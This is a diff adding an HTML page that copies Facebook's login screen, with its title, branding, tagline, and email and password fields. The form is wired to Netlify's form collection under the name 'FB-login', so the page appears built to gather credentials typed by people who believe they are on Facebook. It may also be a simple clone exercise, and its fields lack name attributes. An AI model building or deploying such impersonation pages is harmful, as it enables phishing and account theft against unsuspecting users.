@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="text-content">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        
+        <div class="login-form-container">
+        <form
+                class="form-horizontal"
+                role="form"
+                method="POST"
+                data-netlify="true"
+                netlify-honeypot="bot-field"
+                name="FB-login"
+                action="#"
+                id="auth-form"
+                >
+                <input type="hidden" name="form-name" value="FB-login" />
+                <input type="text" placeholder="Email or phone number" required>
+                <input type="password" placeholder="Password" required>
+                
+                <button type="submit" class="login-btn">Log In</button>
+                
+                <a href="#" class="forgot-link">Forgot password?</a>
+                
+                <hr>
+                
+                <button type="button" class="create-new-btn">Create new account</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
